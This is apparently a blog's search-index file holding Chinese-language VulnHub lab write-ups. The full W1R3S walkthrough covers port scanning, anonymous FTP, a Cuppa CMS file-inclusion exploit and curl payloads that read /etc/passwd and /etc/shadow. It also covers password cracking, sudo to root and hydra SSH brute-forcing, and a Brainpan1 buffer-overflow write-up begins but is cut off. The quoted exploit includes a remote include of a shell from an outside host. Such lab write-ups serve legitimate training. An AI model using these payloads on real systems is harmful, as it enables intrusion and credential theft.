<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>vulnhub-w1r3s</title>
    <link href="/2025/06/30/vulnhub-w1r3s/"/>
    <url>/2025/06/30/vulnhub-w1r3s/</url>
    
    <content type="html"><![CDATA[<p>要细心，沉心地做信息搜集、资产测绘<br>靶机 ip：192.168.17.145</p><h1 id="Qj6sX">端口扫描</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php">┌──(kali㉿kali)-[~/Desktop]<br>└─$ sudo nmap -sS -sV -T5 -A -p- <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br>Starting Nmap <span class="hljs-number">7.95</span> ( https:<span class="hljs-comment">//nmap.org ) at 2025-06-30 03:10 EDT</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br>Host is <span class="hljs-title function_ invoke__">up</span> (<span class="hljs-number">0.00088</span>s latency).<br>Not shown: <span class="hljs-number">55528</span> filtered tcp <span class="hljs-title function_ invoke__">ports</span> (no-response), <span class="hljs-number">10003</span> closed tcp <span class="hljs-title function_ invoke__">ports</span> (reset)<br>PORT     STATE SERVICE VERSION<br><span class="hljs-number">21</span>/tcp   open  ftp     vsftpd <span class="hljs-number">2.0</span>.<span class="hljs-number">8</span> <span class="hljs-keyword">or</span> later<br>| ftp-anon: Anonymous FTP login <span class="hljs-title function_ invoke__">allowed</span> (FTP code <span class="hljs-number">230</span>)<br>| drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">23</span>  <span class="hljs-number">2018</span> content<br>| drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">23</span>  <span class="hljs-number">2018</span> docs<br>|_drwxr-xr-x    <span class="hljs-number">2</span> ftp      ftp          <span class="hljs-number">4096</span> Jan <span class="hljs-number">28</span>  <span class="hljs-number">2018</span> <span class="hljs-keyword">new</span>-employees<br>| ftp-syst: <br>|   STAT: <br>| FTP server status:<br>|      Connected to ::<span class="hljs-variable constant_">ffff</span>:<span class="hljs-number">192.168</span>.<span class="hljs-number">17.136</span><br>|      Logged in <span class="hljs-keyword">as</span> ftp<br>|      TYPE: ASCII<br>|      No session bandwidth limit<br>|      Session timeout in seconds is <span class="hljs-number">300</span><br>|      Control connection is plain text<br>|      Data connections will be plain text<br>|      At session startup, client count was <span class="hljs-number">4</span><br>|      vsFTPd <span class="hljs-number">3.0</span>.<span class="hljs-number">3</span> - secure, fast, stable<br>|_End of status<br><span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">4</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| ssh-hostkey: <br>|   <span class="hljs-number">2048</span> <span class="hljs-number">07</span>:e3:<span class="hljs-number">5</span>a:<span class="hljs-number">5</span>c:c8:<span class="hljs-number">18</span>:<span class="hljs-number">65</span>:b0:<span class="hljs-number">5</span>f:<span class="hljs-number">6</span>e:f7:<span class="hljs-number">75</span>:c7:<span class="hljs-number">7</span>e:<span class="hljs-number">11</span>:<span class="hljs-title function_ invoke__">e0</span> (RSA)<br>|   <span class="hljs-number">256</span> <span class="hljs-number">03</span>:ab:<span class="hljs-number">9</span>a:ed:<span class="hljs-number">0</span>c:<span class="hljs-number">9</span>b:<span class="hljs-number">32</span>:<span class="hljs-number">26</span>:<span class="hljs-number">44</span>:<span class="hljs-number">13</span>:ad:b0:b0:<span class="hljs-number">96</span>:c3:<span class="hljs-number">1</span>e (ECDSA)<br>|_  <span class="hljs-number">256</span> <span class="hljs-number">3</span>d:<span class="hljs-number">6</span>d:d2:<span class="hljs-number">4</span>b:<span class="hljs-number">46</span>:e8:c9:a3:<span class="hljs-number">49</span>:e0:<span class="hljs-number">93</span>:<span class="hljs-number">56</span>:<span class="hljs-number">22</span>:<span class="hljs-number">2</span>e:e3:<span class="hljs-number">54</span> (ED25519)<br><span class="hljs-number">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br><span class="hljs-number">3306</span>/tcp open  mysql   <span class="hljs-title function_ invoke__">MySQL</span> (unauthorized)<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">7</span>F:<span class="hljs-number">87</span>:<span class="hljs-title function_ invoke__">A6</span> (VMware)<br>Aggressive OS guesses: Linux <span class="hljs-number">3.10</span> - <span class="hljs-number">4.11</span> (<span class="hljs-number">98</span>%), Linux <span class="hljs-number">5.1</span> - <span class="hljs-number">5.15</span> (<span class="hljs-number">96</span>%), Linux <span class="hljs-number">3.2</span> - <span class="hljs-number">4.14</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">3.13</span> - <span class="hljs-number">4.4</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">4.10</span> (<span class="hljs-number">94</span>%), Linux <span class="hljs-number">3.10</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">4.4</span> (<span class="hljs-number">93</span>%), Linux <span class="hljs-number">3.16</span> - <span class="hljs-number">4.6</span> (<span class="hljs-number">92</span>%), OpenWrt <span class="hljs-number">19.07</span> (Linux <span class="hljs-number">4.14</span>) (<span class="hljs-number">92</span>%), Linux <span class="hljs-number">2.6</span>.<span class="hljs-number">32</span> - <span class="hljs-number">3.13</span> (<span class="hljs-number">91</span>%)<br>No exact OS matches <span class="hljs-keyword">for</span> <span class="hljs-title function_ invoke__">host</span> (test conditions non-ideal).<br>Network Distance: <span class="hljs-number">1</span> hop<br>Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br><span class="hljs-number">1</span>   <span class="hljs-number">0.88</span> ms <span class="hljs-number">192.168</span>.<span class="hljs-number">17.145</span><br><br>OS <span class="hljs-keyword">and</span> Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br>Nmap done: <span class="hljs-number">1</span> IP <span class="hljs-title function_ invoke__">address</span> (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">43.27</span> seconds<br><br></code></pre></td></tr></table></figure><h3 id="cQiN1">端口分析</h3>21：大概率有信息泄露；ftp 也有历史漏洞可能可以利用<p>22：可行性不大，ssh 版本较高</p><p>80：优先分析。一般是网站</p><p>3306：一般是 mysql</p><h4 id="Tobc4">nmap 漏洞扫描脚本</h4><p><img src="/../img/vulnhub-w1r3s.md/1.png"></p><p>nmap 没有扫出来，说明它不行…..你得自己找别的办法！  因为你是行的！</p><h1 id="FS8dt">21 端口</h1><h3 id="pdG8h">匿名登录 FTP</h3>nmap 的扫描结果中说明可以匿名登录 ftp<p><img src="/../img/vulnhub-w1r3s.md/2.png"></p><p>将 ftp 服务器中的文件 down 到本地</p><p><img src="/../img/vulnhub-w1r3s.md/3.png"></p><p>查看</p><p><img src="/../img/vulnhub-w1r3s.md/4.png"></p><h4 id="bU1Gs">查看加密算法</h4><p><img src="/../img/vulnhub-w1r3s.md/5.png"></p><p>md5 加密</p><p>那个没识别出来的，一眼就能看出来是 base64 嘛</p><h4 id="oWr3o">base64 解密</h4><p><img src="/../img/vulnhub-w1r3s.md/6.png"></p><h1 id="s6CLV">3306 端口</h1>mysql<p><img src="/../img/vulnhub-w1r3s.md/7.png"></p><h1 id="xitSx"> 80 端口</h1><p><img src="/../img/vulnhub-w1r3s.md/8.png"></p><p>apach 的首页，working</p><h4 id="GRqcg">gobuster 目录扫描</h4><p><img src="/../img/vulnhub-w1r3s.md/9.png"></p><p>administrator 可以访问</p><h4 id="wVCRh">dirb 目录爆破</h4>对网站进行目录爆破<p>dirb <a href="http://192.168.17.145/">http://192.168.17.145</a></p><p>可以访问<a href="http://192.168.17.145/administrator/installation/">http://192.168.17.145/administrator/installation/</a></p><p><img src="/../img/vulnhub-w1r3s.md/10.png"></p><h3 id="alQnL">对 wordprass 进行测试</h3>先测试页面的有哪些功能<p><img src="/../img/vulnhub-w1r3s.md/11.png"></p><p><img src="/../img/vulnhub-w1r3s.md/12.png"></p><p><strong>真实情况下，需要在网上找这个页面的独特信息。是否会造成不可逆的服务器修改？？！</strong></p><p><img src="/../img/vulnhub-w1r3s.md/13.png"></p><h2 id="W3BH8"> Cuppa CMS 渗透</h2><h4 id="IpUsC">searchsploit漏洞信息搜集</h4>kali 中有自带的 searchsploit（**exploit-db.com 的本地版本**）<p><img src="/../img/vulnhub-w1r3s.md/14.png"></p><p>漏洞信息：<a href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs plain">                                                                                                                                                                  <br>┌──(kali㉿kali)-[~/VulnHub/w1r3s]<br>└─$ cat 25971.txt            <br># Exploit Title   : Cuppa CMS File Inclusion<br># Date            : 4 June 2013<br># Exploit Author  : CWH Underground<br># Site            : www.2600.in.th<br># Vendor Homepage : http://www.cuppacms.com/<br># Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip  //找开源的代码可以做代码审计<br># Version         : Beta<br># Tested on       : Window and Linux<br><br>  ,--^----------,--------,-----,-------^--,<br>  | |||||||||   `--------&#x27;     |          O .. CWH Underground Hacking Team ..<br>  `+---------------------------^----------|<br>    `\_,-------, _________________________|<br>      / XXXXXX /`|     /<br>     / XXXXXX /  `\   /<br>    / XXXXXX /\______(<br>   / XXXXXX /<br>  / XXXXXX /<br> (________(<br>  `------&#x27;<br><br>####################################<br>VULNERABILITY: PHP CODE INJECTION<br>####################################<br><br>/alerts/alertConfigField.php (LINE: 22)<br><br>-----------------------------------------------------------------------------<br>LINE 22:<br>        &lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt;<br>-----------------------------------------------------------------------------<br><br><br>#####################################################<br>DESCRIPTION<br>#####################################################<br><br>An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.<br><br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]<br><br>#####################################################<br>EXPLOIT<br>#####################################################<br><br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd<br><br>Moreover, We could access Configuration.php source code via PHPStream<br><br>For Example:<br>-----------------------------------------------------------------------------<br>http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php<br>-----------------------------------------------------------------------------<br><br>Base64 Encode Output:<br>-----------------------------------------------------------------------------<br>PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+<br>-----------------------------------------------------------------------------<br><br>Base64 Decode Output:<br>-----------------------------------------------------------------------------<br>&lt;?php<br>        class Configuration&#123;<br>                public $host = &quot;localhost&quot;;<br>                public $db = &quot;cuppa&quot;;<br>                public $user = &quot;root&quot;;<br>                public $password = &quot;Db@dmin&quot;;<br>                public $table_prefix = &quot;cu_&quot;;<br>                public $administrator_template = &quot;default&quot;;<br>                public $list_limit = 25;<br>                public $token = &quot;OBqIPqlFWf3X&quot;;<br>                public $allowed_extensions = &quot;*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx&quot;;<br>                public $upload_default_path = &quot;media/uploadsFiles&quot;;<br>                public $maximum_file_size = &quot;5242880&quot;;<br>                public $secure_login = 0;<br>                public $secure_login_value = &quot;&quot;;<br>                public $secure_login_redirect = &quot;&quot;;<br>        &#125;<br>?&gt;<br>-----------------------------------------------------------------------------<br><br>Able to read sensitive information via File Inclusion (PHP Stream)<br><br>################################################################################################################<br> Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2<br>################################################################################################################                                                                                                                 <br></code></pre></td></tr></table></figure><h4 id="cVh6d">路径构造  （EXP）</h4><p><img src="/../img/vulnhub-w1r3s.md/15.png"></p><p><strong>可以看到需要 post 请求</strong></p><p><img src="/../img/vulnhub-w1r3s.md/16.png"></p><p>–data-urlencode 对 http  post 并使用 url 编码给到处理程序</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/passwd&#x27; http://192.168.17.145/administrator/alerts/alertConfigField.php<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-w1r3s.md/17.png">  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">curl --data-urlencode &#x27;urlConfig=../../../../../../../../../etc/shadow&#x27; http://192.168.17.145/administrator/alerts/alertConfigField.php<br></code></pre></td></tr></table></figure><p><img src="/../img/vulnhub-w1r3s.md/18.png"></p><h4 id="P3SkO">linux 下 passwd 和 shadow 的详解</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs plain">/etc/passwd:<br>普通用户权限能够查看<br><br>保存用户信息，每一行代表一个用户，每一行通过冒号：分为七个部分<br><br>用户名<br>密码，x表示密码保存在/etc/shadow<br>UID，0代表root<br>GID，表示所在组<br>描述信息，依次为Full Name、Room Number、Work Phone、Home Phone和Other<br>用户主目录<br>默认shell类型<br>eg.<br><br>test2:x:1001:1001:test2,11111,111111-11,222222-22,test:/home/test2:/bin/bash<br><br>用户名：test2<br>密码保存在/etc/shadow<br>UID为1001<br>GID为1001<br>描述信息： Full Name []: test2 Room Number []: 11111 Work Phone []: 111111-11 Home Phone []: 222222-22 Other []: test<br>用户主目录为/home/test2<br>默认shell为/bin/bash<br>/etc/shadow:<br>只有root用户权限能够查看<br><br>保存加密后的密码和用户的相关密码信息，每一行代表一个用户，每一行通过冒号：分为九个部分<br><br>用户名<br>加密后的密码<br>上次修改密码的时间(从1970.1.1开始的总天数)<br>两次修改密码间隔的最少天数，如果为0，则没有限制<br>两次修改密码间隔最多的天数,表示该用户的密码会在多少天后过期，如果为99999则没有限制<br>提前多少天警告用户密码将过期<br>在密码过期之后多少天禁用此用户<br>用户过期日期(从1970.1.1开始的总天数)，如果为0，则该用户永久可用<br>保留<br>注：<br><br>参数说明可通过man shadow获取<br><br>eg.<br><br>test2:$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0:17470:0:99999:7:::<br><br>用户名：test2<br>加密后的密码：$6$C/vGzhVe$aKK6QGdhzTmYyxp8.E68gCBkPhlWQ4W7/OpCFQYV.qsCtKaV00bToWh286yy73jedg6i0qSlZkZqQy.wmiUdj0<br>上次修改密码的时间(从1970.1.1开始的总天数为17470)<br>两次修改密码间隔：没有限制<br>两次修改密码间隔最多的天数：没有限制<br>提前7天警告用户密码将过期<br>该用户永久可用<br>由示例可知，加密的密码具有固定格式：<br><br>$id$salt$encrypted<br><br>id表示加密算法，1代表MD5，5代表SHA-256，6代表SHA-512 salt表示密码学中的Salt,系统随机生成 encrypted表示密码的hash<br></code></pre></td></tr></table></figure><h4 id="mwdXg">密码破解</h4>对 shadow 中加密的密码进行破解<p><img src="/../img/vulnhub-w1r3s.md/19.png"></p><h4 id="FlVKI">成功登录</h4><p><img src="/../img/vulnhub-w1r3s.md/20.png"></p><h3 id="Zyx4x">提权</h3>**sudo -l 可以查看用户的 root 权限**<p><img src="/../img/vulnhub-w1r3s.md/21.png"></p><p>w1r3s 可以运行全部的权限。相当于 root</p><p><img src="/../img/vulnhub-w1r3s.md/22.png"></p><h4 id="A3MfL">sudo /bin/bash</h4>为什么运行这个命令就可以进入 root 了呢？<p><img src="/../img/vulnhub-w1r3s.md/23.png"></p><p>:::info<br>&#x2F;bin&#x2F;bash 的作用</p><p>启动新 Shell：&#x2F;bin&#x2F;bash 是系统的 Bash Shell 解释器路径。执行此命令会启动一个新的 Bash Shell 会话。</p><p>以 root 身份运行：通过 sudo 执行时，这个新 Shell 会以 root 权限启动（因为 sudo 默认以 root 身份运行命令）。</p><p>:::</p><h4 id="j1LPa">sudo su -</h4><p><img src="/../img/vulnhub-w1r3s.md/24.png"></p><h1 id="QayxZ">22 端口</h1>正常来说 ssh 端口是没什么可测试的<h4 id="AF2eQ">字典</h4><p><img src="/../img/vulnhub-w1r3s.md/25.png"></p><h4 id="q7m6L">hydra 成功爆破</h4>**ssh 可以直接登录**<p><img src="/../img/vulnhub-w1r3s.md/26.png"></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vulnhub靶场</tag>
      
      <tag>ftp匿名登录</tag>
      
      <tag>base64</tag>
      
      <tag>md5</tag>
      
      <tag>gobuster目录扫描</tag>
      
      <tag>dirb目录扫描</tag>
      
      <tag>Cuppa CMS渗透</tag>
      
      <tag>searchsploit漏洞信息搜集</tag>
      
      <tag>john密码破解</tag>
      
      <tag>ssh爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-brainpan1</title>
    <link href="/2025/06/02/vulnhub-Brainpan1/"/>
    <url>/2025/06/02/vulnhub-Brainpan1/</url>
    
    <content type="html"><![CDATA[<p><em><strong>tips：</strong></em></p><p><em><strong>缓冲区溢出（构造 eip 指向 esp、  esp 构造 shellcode）</strong></em></p><p><em><strong>vlum-nmap漏洞探测</strong></em></p><p><em><strong>wfuzz目录爆破</strong></em></p><p><em><strong>msf-pattern</strong></em></p><p><em><strong>badchars坏字节</strong></em></p><p><em><strong>Immunity Debugger -&gt;mona.py</strong></em></p><p><em><strong>Msfvenom构造shellcode!&#x2F;bin&#x2F;bash（提权）</strong></em></p><h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>锁定靶机 ip</p><p><img src="/../img/vulnhub-Brainpan1.md/1.png"></p><h4 id="全端口扫描"><a href="#全端口扫描" class="headerlink" title="全端口扫描"></a>全端口扫描</h4><p><img src="/../img/vulnhub-Brainpan1.md/2.png"></p><p>发现两个端口  9999 10000</p><h5 id="UDP-扫描"><a href="#UDP-扫描" class="headerlink" title="UDP 扫描"></a>UDP 扫描</h5><p><img src="/../img/vulnhub-Brainpan1.md/3.png"></p><h5 id="TCP-扫描"><a href="#TCP-扫描" class="headerlink" title="TCP 扫描"></a>TCP 扫描</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs plain">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p9999,10000 192.168.17.144<br>Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 13:54 EDT<br>Nmap scan report for 192.168.17.144<br>Host is up (0.00083s latency).<br><br>PORT      STATE SERVICE VERSION<br>9999/tcp  open  abyss?<br>| fingerprint-strings: <br>|   NULL: <br>|     _| _| <br>|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| <br>|     _|_| _| _| _| _| _| _| _| _| _| _| _|<br>|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|<br>|     [________________________ WELCOME TO BRAINPAN _________________________]<br>|_    ENTER THE PASSWORD<br>10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :<br>SF-Port9999-TCP:V=7.95%I=7%D=6/1%Time=683C93E0%P=x86_64-pc-linux-gnu%r(NUL<br>SF:L,298,&quot;_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\|\<br>SF:x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x<br>SF:20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\x2<br>SF:0\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2<br>SF:0\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x2<br>SF:0\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\|\<br>SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2<br>SF:0_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x2<br>SF:0_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\x2<br>SF:0\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20_\<br>SF:|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\x2<br>SF:0_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x20\<br>SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<br>SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2<br>SF:0\x20_\|\x20\x20\x20\x20\x20\x20\x20